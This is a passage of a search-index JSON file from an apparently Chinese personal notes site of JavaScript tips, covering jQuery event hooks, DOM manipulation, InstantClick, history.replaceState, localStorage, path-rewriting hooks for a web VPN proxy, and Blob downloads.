\u6548\u679c\uff1a\u5982\u679c\u6d4f\u89c8\u5668\u81ea\u52a8\u586b\u5165\u4e86\u6b63\u786e\u7684\u7528\u6237\u540d\u5bc6\u7801\uff0c\u5219\u7528\u6237\u70b9\u51fbLogin\u540e\u5feb\u901f\u95ea\u8fc7\u767b\u5f55\u8f93\u5165\u6846\u5373\u5b8c\u6210\u767b\u5f55\uff1b\u5982\u679c\u6d4f\u89c8\u5668\u6ca1\u6709\u81ea\u52a8\u586b\u5165\u7528\u6237\u540d\u5bc6\u7801\uff0cclicklogin\u51fd\u6570\u76f4\u63a5return\uff0c\u7528\u6237\u6ca1\u6709\u611f\u77e5\uff1b\u5982\u679c\u6d4f\u89c8\u5668\u586b\u5165\u7684\u5bc6\u7801\u662f\u9519\u7684\uff0c\u7528\u6237\u4f1a\u770b\u5230\u5bc6\u7801\u9519\u8bef\u63d0\u793a\uff0c1s\u540e\u518d\u6b21toggle\u767b\u5f55\u7684div\u8981\u6c42\u7528\u6237\u8f93\u5165 From: http://stackoverflow.com/questions/1225102/jquery-event-to-trigger-action-when-a-div-is-made-visible \u5f15\u5165jQuery\u540e\uff0c\u4fee\u6539jQuery\u81ea\u8eab\u7684show\u51fd\u6570\u4ee5\u6269\u5c55bind\uff1a jQuery ( function ( $ ) { var _oldShow = $. fn . show ; $. fn . show = function ( speed , oldCallback ) { return $ ( this ) . each ( function () { var obj = $ ( this ), newCallback = function () { if ( $. isFunction ( oldCallback )) { oldCallback . apply ( obj ); } obj . trigger ( 'afterShow' ); }; // you can trigger a before show if you want obj . trigger ( 'beforeShow' ); // now use the old function to show the element passing the new callback _oldShow . apply ( obj , [ speed , newCallback ]); }); } }); \u7136\u540e\u5c31\u53ef\u4ee5\u4f7f\u7528bind\u6ce8\u518c beforeShow \uff0c afterShow \u54af\uff1a jQuery(function($) { $('#test') .bind('beforeShow', function() { alert('beforeShow'); }) .bind('afterShow', function() { alert('afterShow'); }) .show(1000, function() { alert('in show callback'); }) .show(); });","title":"jQuery\u52ab\u6301show\u4e8b\u4ef6"},{"location":"JavaScript/#get","text":"\u6709\u4e9b\u65f6\u5019\u5bf9GET\u53c2\u6570\u7684\u5904\u7406\u4ea4\u7ed9\u4e86\u524d\u7aef\uff0c\u540e\u7aef\u7684PHP\u53ef\u4ee5$_GET[\u201cparameter\u201d]\uff0c\u524d\u7aefJS\u548b\u529e\u5462\uff1f From: http://stackoverflow.com/questions/979975/how-to-get-the-value-from-the-get-parameters var QueryString = function () { // This function is anonymous , is executed immediately and // the return value is assigned to QueryString ! var query_string = {} ; var query = window . location . search . substring ( 1 ); var vars = query . split ( \"&\" ); for ( var i = 0 ; i < vars . length ; i ++ ) { var pair = vars [ i ] . split ( \"=\" ); // If first entry with this name if ( typeof query_string [ pair[0 ] ] === \"undefined\" ) { query_string [ pair[0 ] ] = decodeURIComponent ( pair [ 1 ] ); // If second entry with this name } else if ( typeof query_string [ pair[0 ] ] === \"string\" ) { var arr = [ query_string[pair[0 ] ] , decodeURIComponent ( pair [ 1 ] ) ] ; query_string [ pair[0 ] ] = arr ; // If third or later entry with this name } else { query_string [ pair[0 ] ] . push ( decodeURIComponent ( pair [ 1 ] )); } } return query_string ; } (); \u6267\u884c\u540e\u5c31\u53ef\u4ee5\u8fd9\u4e48\u4f7f\u7528\uff1a if (typeof(QueryString.parameter)!=\"undefined\") { alert(QueryString.parameter);//do something with the parameter }","title":"\u8bfb\u53d6GET\u53c2\u6570"},{"location":"JavaScript/#github-issue","text":"\u4eba\u5bb6\u5927\u4f6c\u7684\u9879\u76ee\uff1a http://github.com/wzpan/comment.js \uff0c \u4e2d\u6587\u6587\u6863 \u5982\u679c\u89c9\u5f97cloudflare\u52a0\u8f7d\u901f\u5ea6\u4e0d\u4f73\uff0c\u53ef\u4ee5\u628a\u6240\u6709js\u6253\u5305\u6210\u4e00\u4e2a\u6587\u4ef6 \u6548\u679c\u5982\u672c\u535a\u5ba2\u9875\u9762\u5e95\u90e8\u8bc4\u8bba\u533a\u6240\u793a\uff0c\u4e3a\u4e86\u5077\u61d2\u5c31\u6ca1\u6709\u4e3a\u6bcf\u4e2amd\u6587\u4ef6\u5355\u72ec\u5f00issue\u4e86\uff0c\u6574\u4e2ablog\u5171\u7528\u4e00\u4e2aissue","title":"\u4f7f\u7528 Github Issue \u4f5c\u4e3a\u535a\u5ba2\u8bc4\u8bba\u533a"},{"location":"JavaScript/#historyreplacestate","text":"\u5982v2ex\u6309\u7167\u662f\u5426:visited\u6765\u533a\u5206\u70b9\u5f00\u8fc7\u548c\u6ca1\u70b9\u5f00\u8fc7\u7684\u5e16\u5b50\uff0c\u5176\u5b9e\u73b0\u662furl\u5e26\u4e0a#reply\u56de\u590d\u6570\u91cf \u4f46\u5982\u679c\u5e16\u5b50\u9875\u9762\u6709\u591a\u79cd\u8fdb\u5165\u65b9\u5f0f\uff08\u81ea\u52a8\u8df3\u8f6c\u5230\u9875\u5c3e\u3001\u53d1\u8d77\u4e86\u56de\u590d\u7b49\uff09\uff0c\u90a3\u4e48url\u5e76\u4e0d\u4e00\u5b9a\u4e0e\u9700\u8981\u7684\u4e00\u81f4 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528history API\u6765\u4fee\u6539\u5386\u53f2\u8bb0\u5f55\uff0c\u4ece\u800c\u4fdd\u8bc1\u5e26\u4e0a #reply\u56de\u590d\u6570\u91cf \u7684url\u4e00\u5b9a\u88ab\u8ba4\u4e3a\u8bbf\u95ee\u8fc7\uff1b\u800c\u4e14\u81ea\u52a8\u6539\u56de\u53bb\u7528\u6237\u65e0\u611f\u77e5\uff08\u5426\u5219\u5237\u65b0\u540e\u4f1a\u6253\u5f00\u4e0d\u4e00\u6837\u7684\u9875\u9762\uff09 \u4ee3\u7801\u5982\u4e0b\uff1a <script> setTimeout( function(){ var oldurl = location.href; history.replaceState(null, null, '/t/ {{ topic [ \"id\" ] }} #reply {{ topic [ \"replyCount\" ] }} '); history.replaceState(null, null, oldurl); }, 1000); </script>","title":"history.replaceState\u4fee\u6539\u5386\u53f2\u8bb0\u5f55"},{"location":"JavaScript/#checkboxlocalstorage","text":"\u67e5\u8be2\u662f\u5426\u52fe\u9009\u7528 .is(\":checked\") \uff0c \u6539\u53d8\u52fe\u9009\u72b6\u6001\u7528 .prop(\"checked\",true) <script> function checkbox_onclick(){ var checked = $(\"#thecheckbox\").is(\":checked\"); if(checked) localStorage.setItem(\"status_thecheckbox\",\"1\"); else localStorage.setItem(\"status_thecheckbox\",\"0\"); } </script> <input type= \"checkbox\" id= \"thecheckbox\" onclick= 'checkbox_onclick();' > <script> var status_thecheckbox = localStorage.getItem(\"status_thecheckbox\"); if(status_thecheckbox!=null && status_thecheckbox==\"1\") $(\"#thecheckbox\").prop(\"checked\",true); </script>","title":"\u8bb0\u4f4f\u4e00\u4e2acheckbox\u7684\u72b6\u6001\uff08\u7528localStorage\uff09"},{"location":"JavaScript/#nodejs","text":"","title":"NodeJS"},{"location":"JavaScript/#dockernpm","text":"\u4f8b\u5982\u5b89\u88c5canvas\u548cgifencoder\u5305\uff1a PACKAGES = \"canvas gifencoder\" docker run -- rm -- volume = \"`pwd`:/app\" - w / app - it node : 10 npm install $ { PACKAGES } -- registry = https :// registry . npm . taobao . org","title":"\u7528Docker\u6267\u884cnpm"},{"location":"JavaScript/#instantclick","text":"","title":"\u4f7f\u7528InstantClick\u8e29\u5751"},{"location":"JavaScript/#_1","text":"http://instantclick.io/v3.1.0/instantclick.min.js \u4e00\u5b9a\u8981\u5728\u9875\u9762\u5e95\u90e8 </body> \u4e4b\u524d\u624d\u80fd\u5f15\u5165\uff1a <script src= \"instantclick.min.js\" data-no-instant ></script> <script data-no-instant > InstantClick.init('mousedown'); </script>","title":"\u5feb\u901f\u4f7f\u7528"},{"location":"JavaScript/#302","text":"\u5426\u5219\u4f1a\u663e\u793a\u8df3\u8f6c\u4e4b\u524d\u7684URL \u8fd9\u79cd\u60c5\u51b5\u4e0b\u53ef\u4ee5\u5bf9\u8fd9\u4e2a\u94fe\u63a5\u7981\u6b62\u9884\u52a0\u8f7d\uff08\u4e0d\u8fc7\u66f4\u5e94\u8be5\u8003\u8651\u8fd9\u79cd\u94fe\u63a5\u6539\u4e3apost\u8bf7\u6c42\uff09 \u5728a\u6807\u7b7e\u52a0\u4e0a data-no-instant","title":"\u88ab\u9884\u52a0\u8f7d\u7684\u9875\u9762\u4e0d\u80fd\u8ba9\u540e\u7aef\u8fd4\u56de302"},{"location":"JavaScript/#_2","text":"\u5b98\u7f51 \u7ed9\u51fa\u7684\u4ee3\u7801\u4f7f\u7528 InstantClick.init() \uff0c\u610f\u5473\u7740\u9f20\u6807\u79fb\u52a8\u4e0a\u53bb\u5c31\u4f1a\u89e6\u53d1\u52a0\u8f7d\uff08\u4e0d\u662f\u53ea\u89e6\u53d1\u4e00\u6b21\uff09\uff0c\u9f20\u6807\u53cd\u590d\u79fb\u52a8\u4f1a\u5bfc\u81f4\u5927\u91cf\u7684\u8bf7\u6c42 \u5982\u679c\u540e\u7aef\u505a\u4e86\u8bf7\u6c42\u9891\u7387\u9650\u5236 \u9700\u8981\u653e\u5bbd\u9650\u5236 \u8fd8\u662f\u6539\u4e3a\u7528 mousedown \u6765\u521d\u59cb\u5316 \u53ea\u6709\u7528\u6237\u786e\u5b9e\u70b9\u51fb\u4e86\u624d\u5f00\u59cb\u52a0\u8f7d \u636e\u8bf4\u4e5f\u80fd\u6709\u5f88\u597d\u7684\u6548\u679c","title":"\u6ce8\u610f\u9ed8\u8ba4\u914d\u7f6e\u4e0b\u540e\u7aef\u5c06\u88ab\u9891\u7e41\u8bf7\u6c42 \u9891\u7387\u9650\u5236\u9700\u8981\u653e\u5bbd"},{"location":"JavaScript/#instantclick-js","text":"","title":"InstantClick\u5f15\u5165\u4e00\u4e9b\u526f\u4f5c\u7528 \u5bf9\u9875\u9762js\u8981\u8fdb\u884c\u4fee\u6539"},{"location":"JavaScript/#jsreferrer","text":"\u9875\u9762\u52a0\u8f7d\u7684\u8bf7\u6c42\u662fjs\u6267\u884c\u7684 document.referrer\u4e0d\u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u4e0a\u4e00\u9875","title":"js\u65e0\u6cd5\u53d6\u5f97\u6b63\u786e\u7684referrer"},{"location":"JavaScript/#documentaddeventlistener","text":"\u4f8b\u5982\u7ed1\u5b9apaste\u4e8b\u4ef6 \u4f60\u53ef\u80fd\u8fd9\u4e48\u5199\uff1a document.addEventListener('paste', handlepaste); \u5728\u5207\u6362\u9875\u9762\u540e \u8fd9\u4e2a\u4e8b\u4ef6\u4f1a\u591a\u6b21\u7ed1\u5b9a \u5bfc\u81f4\u591a\u6b21\u89e6\u53d1 \u6211\u7684\u505a\u6cd5\u662f\u5148\u5224\u65ad\u4e00\u4e2a\u53d8\u91cf\u662f\u5426\u5b58\u5728 \u4e0d\u5b58\u5728\u624d\u8bbe\u7f6e\uff1a if(typeof paste_registered == \"undefined\"){ document.addEventListener('paste', handlepaste); paste_registered = true; } \u4f60\u4e5f\u53ef\u4ee5\u628a\u8fd9\u4e00\u90e8\u5206 \u4e0d\u80fd\u91cd\u590d\u6267\u884c \u7684\u4ee3\u7801\u653e\u5165 <script data-no-instant> \u4e2d\uff0c\u4f46\u5982\u679c\u524d\u4e00\u9875\u6ca1\u6709\u8fd9\u4e00\u5757\u4ee3\u7801\uff08\u4e5f\u5c31\u662f\u8fd9\u4e2a\u4ee3\u7801\u662f\u5f53\u524d\u9875\u9762\u624d\u6709\u7684\uff0c\u9700\u8981\u6267\u884c\u4e00\u6b21\uff09\uff0c\u8fdb\u5165\u5f53\u524d\u9875\u9762\u662f \u4e0d\u4f1a\u89e6\u53d1 \u7684","title":"document.addEventListener \u91cd\u590d\u89e6\u53d1"},{"location":"JavaScript/#js","text":"\u73b0\u5728\u7684\u65b9\u6cd5\u662f\u5bf9js\u52a8\u6001\u6dfb\u52a0\u7684\u5143\u7d20\u52a0\u4e2aclass \u7136\u540e\u7528jQuery\u7684remove\u65b9\u6cd5\u5148\u901a\u901a\u5220\u6389\u518d\u6dfb\u52a0","title":"\u8fd4\u56de\u4e0a\u4e00\u9875\u91cd\u590d\u6267\u884c\u9875\u9762\u6dfb\u52a0\u5143\u7d20\u7684js \u5bfc\u81f4\u5143\u7d20\u91cd\u590d\u51fa\u73b0"},{"location":"JavaScript/#ready","text":"\u9700\u8981\u52a0\u5165 InstantClick.on('change', callback); \u52a0\u5230Init\u540e\u5373\u53ef \u4f46\u662f\u4f3c\u4e4e\u8fd9\u4e2a\u4e8b\u4ef6\u89e6\u53d1\u5728\u9875\u9762\u56fe\u7247\u52a0\u8f7d\u5b8c\u6210\u4e4b\u524dOrz \u4e0d\u591f\u5b8c\u7f8e","title":"\u9875\u9762ready\u4e8b\u4ef6\u4e0d\u4f1a\u89e6\u53d1"},{"location":"JavaScript/#hash","text":"\u9884\u52a0\u8f7d\u7684\u9875\u9762\u603b\u662f\u5b9a\u4f4d\u5230\u9876\u90e8\uff0c\u5ffd\u89c6\u5730\u5740\u680f\u4e2d\u7684 #end \u8fd9\u79cd\u5b9a\u4f4dhash \u6211\u7684\u505a\u6cd5\u662f\u8fd9\u6837\u5199\u4e0a\u8ff0onchange\u7684callback\u51fd\u6570 implement_hashjump \uff1a function has_hashjump (){ // if there is a #hash present for jumpping, return true var hash = document . location . hash . replace ( \"#\" , \"\" ); if ( ! hash ) return false ; if ( document . getElementById ( hash ) || document . getElementsByName ( hash ) . length > 0 ) return true ; else return false ; } function implement_hashjump () { if ( has_hashjump () ) { var hash = document . location . hash . replace ( \"#\" , \"\" ); if ( document . getElementById ( hash )) { document . documentElement . scrollTop = $ ( \"#\" + hash ) . offset () . top ; } else { document . documentElement . scrollTop = $ ( \"[name='\" + hash + \"']\" ) . offset () . top ; } } }","title":"\u8d85\u94fe\u63a5\u7684#hash\u5b9a\u4f4d\u529f\u80fd\u4e5f\u9700\u8981\u81ea\u5df1\u5b9e\u73b0"},{"location":"JavaScript/#javascriptdom-the-basics-of-dom-manipulation-in-vanilla-javascript","text":"https://www.sitepoint.com/dom-manipulation-vanilla-javascript-no-jquery/","title":"\u7528\u539f\u751fJavascript\u64cd\u4f5cDOM\u8282\u70b9 The Basics of DOM Manipulation in Vanilla JavaScript"},{"location":"JavaScript/#_3","text":"const myElement = document . querySelector ( '#foo > div.bar' ) myElement . matches ( 'div.bar' ) === true \u6ce8\u610fquerySelector\u662f\u7acb\u5373\u6267\u884c \u800cgetElementsByTagName\u662f\u53d6\u503c\u7684\u65f6\u5019\u6267\u884c\u6548\u7387\u66f4\u9ad8 \u5bf9\u5143\u7d20\u5217\u8868\u904d\u5386\u5e94\u8be5\u8fd9\u4e48\u5199\uff1a [].forEach.call(myElements, doSomethingWithEachElement) myElement.children , myElement.firstElementChild \u53ea\u4f1a\u6709tag\uff0c\u800c myElement.childNodes , myElement.firstChild \u4f1a\u6709\u6587\u672c\u8282\u70b9 \u5982\uff1a myElement.firstChild.nodeType === 3 // this would be a text node","title":"\u9009\u62e9\u5143\u7d20"},{"location":"JavaScript/#class","text":"myElement . classList . add ( 'foo' ) myElement . classList . remove ( 'bar' ) myElement . classList . toggle ( 'baz' ) // Set multiple properties using Object . assign () Object . assign ( myElement , { value : 'foo' , id : 'bar' } ) // Remove an attribute myElement . value = null \u9664\u4e86\u76f4\u63a5\u8d4b\u503c\uff0c\u8fd8\u6709\u8fd9\u4e9b\u65b9\u6cd5 .getAttibute(), .setAttribute() and .removeAttribute() \u4f46\u4ed6\u4eec\u4f1a\u76f4\u63a5\u4fee\u6539HTML \u5bfc\u81f4\u91cd\u7ed8 \u53ea\u6709\u6ca1\u6709\u5bf9\u5e94\u5c5e\u6027\u7684\u65f6\u5019\u5982 colspan \u624d\u5e94\u8be5\u8fd9\u4e48\u5e72","title":"\u4fee\u6539class\u548c\u5c5e\u6027"},{"location":"JavaScript/#css","text":"myElement . style . marginLeft = '2em' // \u83b7\u5f97\u8ba1\u7b97\u51fa\u6765\u7684 CSS\u5c5e\u6027 getComputedStyle ( myElement ). getPropertyValue ( 'margin-left' )","title":"\u4fee\u6539CSS"},{"location":"JavaScript/#dom","text":"const myNewElement = document . createElement ( 'div' ) const myNewTextNode = document . createTextNode ( 'some text' ) // Append element1 as the last child of element2 element1 . appendChild ( element2 ) // Insert element2 as child of element 1 , right before element3 element1 . insertBefore ( element2 , element3 ) // Create a clone const myElementClone = myElement . cloneNode () myParentElement . appendChild ( myElementClone ) // \u5220\u9664\u4e00\u4e2a\u8282\u70b9 myElement . parentNode . removeChild ( myElement ) \u5f53\u9700\u8981\u628a\u591a\u4e2a\u5143\u7d20appendChild\u5230\u4e00\u4e2a\u5df2\u7ecf\u5728\u9875\u9762\u4e0a\u7684\u5143\u7d20\u65f6\uff0c\u6bcf\u6b21append\u90fd\u4f1a\u91cd\u7ed8 \u8fd9\u65f6\u5019\u5c31\u5e94\u8be5\u7528 DocumentFragment const fragment = document . createDocumentFragment () fragment . appendChild ( text ) fragment . appendChild ( hr ) myElement . appendChild ( fragment )","title":"\u4fee\u6539DOM"},{"location":"JavaScript/#_4","text":"\u4e8b\u4ef6event\u91cc\u9762\u6709 target \u6307\u5411\u8c01\u89e6\u53d1\u7684\u4e8b\u4ef6 const myForm = document . forms [ 0 ] const myInputElements = myForm . querySelectorAll ( 'input' ) Array . from ( myInputElements ) . forEach ( el => { el . addEventListener ( 'change' , function ( event ) { console . log ( event . target . value ) }) })","title":"\u76d1\u542c\u4e8b\u4ef6"},{"location":"JavaScript/#_5","text":".preventDefault() .stopPropagation() \u5b50\u8282\u70b9click\u4e0d\u4f1a\u518d\u5192\u6ce1\u89e6\u53d1\u7236\u8282\u70b9onclick","title":"\u963b\u6b62\u9ed8\u8ba4\u884c\u4e3a"},{"location":"JavaScript/#event-delegation","text":"\u5bf9\u8868\u5355\u6bcf\u4e2ainput\u4fee\u6539\u65f6\u6267\u884c\uff0c\u76f4\u63a5\u5bf9form\u6dfb\u52a0change\u7684\u4e8b\u4ef6 \u4e0d\u9700\u8981\u5bf9\u6bcf\u4e2ainput\u6dfb\u52a0\uff0c\u8fd9\u6837\u4e5f\u81ea\u52a8\u652f\u6301\u52a8\u6001\u65b0\u6dfb\u52a0\u7684input myForm . addEventListener ( 'change' , function ( event ) { const target = event . target if ( target . matches ( 'input' )) { console . log ( target . value ) } })","title":"Event delegation"},{"location":"JavaScript/#_6","text":"\u9700\u8981\u9ad8\u6027\u80fd\u65f6 \u4e0d\u8981\u7528setTimeout \u800c\u4f7f\u7528 requestAnimationFrame const start = window . performance . now () const duration = 2000 window . requestAnimationFrame ( function fadeIn ( now )) { const progress = now - start myElement . style . opacity = progress / duration if ( progress < duration ) { window . requestAnimationFrame ( fadeIn ) } }","title":"\u52a8\u753b"},{"location":"JavaScript/#src","text":"React\u7f51\u7ad9\u5e94\u7528\u5e95\u5c42\u7528\u7684\u662fcreateElement\u65b9\u6cd5\uff08svg\u7b49\u5bf9\u8c61\u7528createElementNS\uff09\uff0c\u53ef\u4ee5\u901a\u8fc7\u52ab\u6301document\u6240\u5c5e\u7c7b\u539f\u578b\u7684createElement\u65b9\u6cd5\u6765\u5b9e\u73b0\u56fe\u7247\u8def\u5f84\u91cd\u5b9a\u5411 \u4f46\u662f\u6ca1\u6709\u8003\u8651\u4f7f\u7528innerHTML\u76f4\u63a5\u8d4b\u503c\u7684\u64cd\u4f5c\uff0c\u5982\u679c\u76ee\u6807\u7ad9\u70b9\u786e\u5b9e\u7528\u4e86\u8fd9\u79cd\u6280\u672f\uff0c\u5927\u4e0d\u4e86\u518d\u52a0\u4e2a\u5b9a\u65f6\u5668\u904d\u5386\u5373\u53ef var dc = HTMLDocument . prototype . createElement ; HTMLDocument . prototype . createElement = function ( tag , options ) { var r = dc . call ( document , tag , options ); if ( tag == \"img\" || tag == 'a' ) { var x = r . setAttribute ; r . setAttribute = function ( a , b ){ if ( a == \"src\" || a == \"href\" ){ if ( b [ 0 ] == \"/\" ) b = b . replace ( \"/\" , window . ROOT ); else { b = b . replace ( \"http://\" , \"/web/0/http/0/\" ); b = b . replace ( \"https://\" , \"/web/0/https/0/\" ); } } return x . call ( r , a , b ); } } return r ; } \u4e0a\u8ff0\u4ee3\u7801\u4f1a\u5c06/\u5f00\u5934\u7684src\u548chref\u5c5e\u6027\u7684\u7b2c\u4e00\u4e2a/\u66ff\u6362\u4e3awindow.ROOT","title":"\u52ab\u6301\u52a8\u6001\u56fe\u7247\u52a0\u8f7d \u4fee\u6539src\u5c5e\u6027"},{"location":"JavaScript/#ajaxfetch","text":"\u9700\u8981\u5c06fetch\u4f7f\u7528xhr\u5b9e\u73b0\uff0c\u7136\u540eHook Ajax\u5373\u53ef \u53c2\u89c1\u5b8c\u6574\u7684RVPN\u52ab\u6301\u4ee3\u7801 jshook_preload.js \u80cc\u666f\u77e5\u8bc6\u53c2\u89c1\uff1aRVPN\u7f51\u9875\u7248\u4ecb\u7ecd https://www.cc98.org/topic/4816921/","title":"\u52ab\u6301Ajax\u548cfetch"},{"location":"JavaScript/#ajax","text":"\u65b9\u6cd5\u5c31\u662f\u628ajQuery\u7684ajax\u51fd\u6570\u8fd4\u56de\u503c\u653e\u5230\u6570\u7ec4\u91cc\u9762\uff0c\u7136\u540e\u7528 $.when.apply(null, \u6570\u7ec4).done \u5373\u53ef \u5b9e\u4f8b\uff1aCC98\u53d1\u7c73\u673a function apiget ( url , callback ){ return $. get ( \"/98api_cache/\" + url , null , callback , \"json\" ); } var async_request = [ check_permission ( topic . boardId )]; var i ; for ( i = from_ ; i >= from_ - 80 ; i -= 20 ){ if ( i < 0 ) break ; async_request . push ( apiget ( \"Topic/\" + topicid + \"/post?from=\" + i + \"&size=20\" , function ( data ){ lastfloors . push . apply ( lastfloors , data ); })) } $. when . apply ( null , async_request ) . done ( function (){ alert ( \"all done\" )} )","title":"\u591a\u4e2aAjax\u8bf7\u6c42\u7b49\u5f85\u5168\u90e8\u5b8c\u6210"},{"location":"JavaScript/#_7","text":"\u9996\u5148\u7b49\u5f85DOM\u8282\u70b9\u5c31\u7eea\uff0c\u627e\u5230\u6240\u6709\u7684img\uff0c\u7b49\u5f85\u56fe\u7247\u52a0\u8f7d\u5b8c\u6210\u540e\u5224\u65ad\u56fe\u7247\u9ad8\u5ea6\u662f\u5426\u5927\u4e8e\u7a97\u53e3\u9ad8\u5ea6\u768480%\uff0c\u5982\u679c\u592a\u957f\u5c31\u8bbe\u7f6e max-width:80vh \uff0c\u53ef\u70b9\u51fb\u5c55\u5f00\uff0c\u518d\u6b21\u70b9\u51fb\u5219\u6298\u53e0\u5e76\u8df3\u81f3\u56fe\u7247\u5f00\u59cb\u7684\u5730\u65b9 ! function ( a ){ \"function\" == typeof define && define . amd ? define ([ \"jquery\" ], a ): \"object\" == typeof exports ? module . exports = a ( require ( \"jquery\" )): a ( jQuery )}( function ( a ){ var b = \"waitForImages\" , c = function ( a ){ return a . srcset && a . sizes }( new Image ); a . waitForImages = { hasImageProperties :[ \"backgroundImage\" , \"listStyleImage\" , \"borderImage\" , \"borderCornerImage\" , \"cursor\" ], hasImageAttributes :[ \"srcset\" ]}, a . expr . pseudos [ \"has-src\" ] = function ( b ){ return a ( b ) . is ( 'img[src][src!=\"\"]' )}, a . expr . pseudos . uncached = function ( b ){ return !! a ( b ) . is ( \":has-src\" ) &&! b . complete }, a . fn . waitForImages = function (){ var d , e , f , g = 0 , h = 0 , i = a . Deferred (), j = this , k = [], l = a . waitForImages . hasImageProperties || [], m = a . waitForImages . hasImageAttributes || [], n =/ url \\ ( \\ s * ([ '\"]?)(.*?) \\1 \\s*\\)/g;if(a.isPlainObject(arguments[0])?(f=arguments[0].waitForAll,e=arguments[0].each,d=arguments[0].finished):1===arguments.length&&\"boolean\"===a.type(arguments[0])?f=arguments[0]:(d=arguments[0],e=arguments[1],f=arguments[2]),d=d||a.noop,e=e||a.noop,f=!!f,!a.isFunction(d)||!a.isFunction(e))throw new TypeError(\"An invalid callback was supplied.\");return this.each(function(){var b=a(this);f?b.find(\"*\").addBack().each(function(){var b=a(this);b.is(\"img:has-src\")&&!b.is(\"[srcset]\")&&k.push({src:b.attr(\"src\"),element:b[0]}),a.each(l,function(a,c){var d,e=b.css(c);if(!e)return!0;for(;d=n.exec(e);)k.push({src:d[2],element:b[0]})}),a.each(m,function(a,c){var d=b.attr(c);return!d||void k.push({src:b.attr(\"src\"),srcset:b.attr(\"srcset\"),element:b[0]})})}):b.find(\"img:has-src\").each(function(){k.push({src:this.src,element:this})})}),g=k.length,h=0,0===g&&(d.call(j),i.resolveWith(j)),a.each(k,function(f,k){var l=new Image,m=\"load.\"+b+\" error.\"+b;a(l).one(m,function b(c){var f=[h,g,\"load\"==c.type];if(h++,e.apply(k.element,f),i.notifyWith(k.element,f),a(this).off(m,b),h==g)return d.call(j[0]),i.resolveWith(j[0]),!1}),c&&k.srcset&&(l.srcset=k.srcset,l.sizes=k.sizes),l.src=k.src}),i.promise()}}); $ ( function (){ $ ( \"img\" ) . waitForImages ( function (){ ( $ ( \"img\" ) . filter ( function (){ return $ ( this ) . height () > document . documentElement . clientHeight * 0.8 }) ) . css ( \"max-height\" , \"80vh\" ) . css ( \"cursor\" , \"pointer\" ) . on ( \"click\" , function (){ if ( $ ( this ) . css ( \"max-height\" ) != \"100%\" ){ $ ( this ) . css ( \"max-height\" , \"100%\" ); } else { $ ( this ) . css ( \"max-height\" , \"80vh\" ); $ ( \"html,body\" ) . animate ({ scrollTop : $ ( this ) . position () . top }, \"fast\" ) } }); })});","title":"\u7b49\u5f85\u56fe\u7247\u52a0\u8f7d\u5b8c\u6210\u540e \u7f29\u5c0f\u8fc7\u5927\u7684\u56fe\u7247"},{"location":"JavaScript/#css-inline","text":"\u53c2\u8003\uff1a https://css-tricks.com/the-blur-up-technique-for-loading-background-images/ \u4f7f\u7528\u4e00\u5f20\u5f88\u5927\u7684\u56fe\u7247\u4f5c\u4e3a\u80cc\u666f\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u9700\u8981\u4e00\u5f20inline\u5230css\u4e2d\u7684\u6a21\u7cca\u80cc\u666f\u56fe\uff0c\u5b8c\u6574\u65b9\u6848\u53c2\u89c1\u4e0a\u8ff0\u94fe\u63a5 \u8fd9\u91cc\u4ecb\u7ecd\u4ece\u4e00\u5f20\u56fe\u7247\u600e\u4e48\u53d8\u6210\u6a21\u7cca\u9884\u89c8\u7684inline CSS: \u9996\u5148\u628a\u56fe\u7247\u53d8\u621040x22\u5927\u5c0f\uff0c\u8fd9\u4e2a\u76f4\u63a5\u7528Windows\u81ea\u5e26\u7684\u753b\u56fe\u5de5\u5177\u5373\u53ef\u5b8c\u6210 \u7136\u540e\u4e22\u7ed9 tinyjpg.com \u518d\u538b\u7f29\u4e00\u4e0b \u7528 base64 -w0 < x.jpg \u83b7\u53d6\u56fe\u7247\u7684base64\u6587\u672c \u653e\u5165\u4e0b\u8ff0svg\u4e2d\uff0c\u518d\u4ea4\u7ed9\u8fd9\u4e2asvg encoder: https://codepen.io/yoksel/details/JDqvs/ < svg xmlns = \"http://www.w3.org/2000/svg\" xmlns : xlink = \"http://www.w3.org/1999/xlink\" width = \"1500\" height = \"823\" viewBox = \"0 0 1500 823\" > < filter id = \"blur\" filterUnits = \"userSpaceOnUse\" color - interpolation - filters = \"sRGB\" > < feGaussianBlur stdDeviation = \"20 20\" edgeMode = \"duplicate\" /> < feComponentTransfer > < feFuncA type = \"discrete\" tableValues = \"1 1\" /> </ feComponentTransfer > </ filter > < image filter = \"url(#blur)\" xlink : href = \"data:image/jpeg;base64,/9j/4AAQSkZJ ...[truncated]...\" x = \"0\" y = \"0\" height = \"100%\" width = \"100%\" /> </ svg > \u6ce8\u610fencoder\u8f93\u51fa\u7684\u5185\u5bb9\u8fd8\u8981\u52a0\u4e0a charset \uff0c\u6700\u7ec8\u6548\u679c\uff1a background-image: url(data:image/svg+xml;charset=utf-8,%3Csvg...);","title":"CSS inline\u6a21\u7cca\u9884\u89c8\u56fe\u7247"},{"location":"JavaScript/#apost-jquery","text":"\u53c2\u8003OneIndex\uff0c\u7528POST\u65b9\u6cd5\u8868\u793a\u6765\u81ea\u6587\u4ef6\u5217\u8868\u7684\u70b9\u51fb\u53ef\u4ee5\u663e\u793a\u7f51\u9875\uff0c\u9ed8\u8ba4\u7684GET\u8bf7\u6c42\u5219\u4e0b\u8f7d\u6587\u4ef6 $('.file a').each(function(){ $(this).on('click', function () { var form = $(' <form target= _blank method= post ></form> ').attr('action', $(this).attr('href')).get(0); $(document.body).append(form); form.submit(); $(form).remove(); return false; }); });","title":"a\u94fe\u63a5\u6539\u7528POST\u8bf7\u6c42 jQuery"},{"location":"JavaScript/#blob","text":"\u53c2\u8003OneIndex\u7684 downall \u65b9\u6cd5 Blob\u6587\u6863\uff1ahttps://developer.mozilla.org/zh-CN/docs/Web/API/Blob \u8fd8\u53ef\u4ee5\u770b\u770b\u8fd9\u7bc7\uff1ahttps://juejin.im/post/59e35d0e6fb9a045030f1f35 let blob = new Blob ([ \"\u6587\u6863\u5185\u5bb9\" ], { type : 'text/plain' }); // \u6784\u9020 Blob\u5bf9\u8c61 let a = document . createElement ( 'a' ); // \u4f2a\u9020\u4e00\u4e2a a\u5bf9\u8c61 a . href = window . URL . createObjectURL ( blob ); // \u6784\u9020 href\u5c5e\u6027\u4e3aBlob\u5bf9\u8c61\u751f\u6210\u7684\u94fe\u63a5 a . download = \"666.txt\" ; // \u6587\u4ef6\u540d\u79f0\uff0c\u4f60\u53ef\u4ee5\u6839\u636e\u4f60\u7684\u9700\u8981\u6784\u9020 a . click () // \u6a21\u62df\u70b9\u51fb a . remove 